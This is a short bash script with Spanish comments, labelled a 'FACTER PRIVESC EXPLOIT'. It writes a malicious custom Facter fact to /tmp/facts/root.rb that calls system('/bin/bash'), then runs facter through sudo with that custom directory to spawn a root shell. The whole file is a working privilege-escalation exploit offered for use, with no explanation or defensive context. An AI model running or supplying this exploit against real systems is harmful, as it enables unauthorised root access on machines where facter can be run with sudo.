#!/bin/bash

# Definir colores
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
NC='\033[0m' # No Color

root=/tmp/facts
facter_path=$(which facter)

echo -e "${BLUE}+----------------------------------+${NC}"
echo -e "${BLUE}|${NC}     ${GREEN}FACTER PRIVESC EXPLOIT${NC}        ${BLUE}|${NC}"
echo -e "${BLUE}+----------------------------------+${NC}"
echo ""

echo -e "${YELLOW}[+]${NC} Creating folder /facts on /tmp"
mkdir -p /tmp/facts
echo ""

echo -e "${YELLOW}[+]${NC} Creating malicious ruby file root.rb"
touch /tmp/facts/root.rb
echo ""

echo -e "${YELLOW}[+]${NC} Writing exploit payload to root.rb"
echo -e 'Facter.add(:pwn) do\n setcode do\n system('\''/bin/bash'\'')\n end\nend' > /tmp/facts/root.rb
echo ""

echo -e "${YELLOW}[+]${NC} Locating facter path"
echo ""
echo -e "${GREEN}[✓]${NC} Facter found at: ${GREEN}$facter_path${NC}"
echo ""

echo -e "${RED}[!]${NC} Exploiting..."
echo -e "${RED}════════════════════════════════════════${NC}"
echo ""

sudo $facter_path --custom-dir=$root
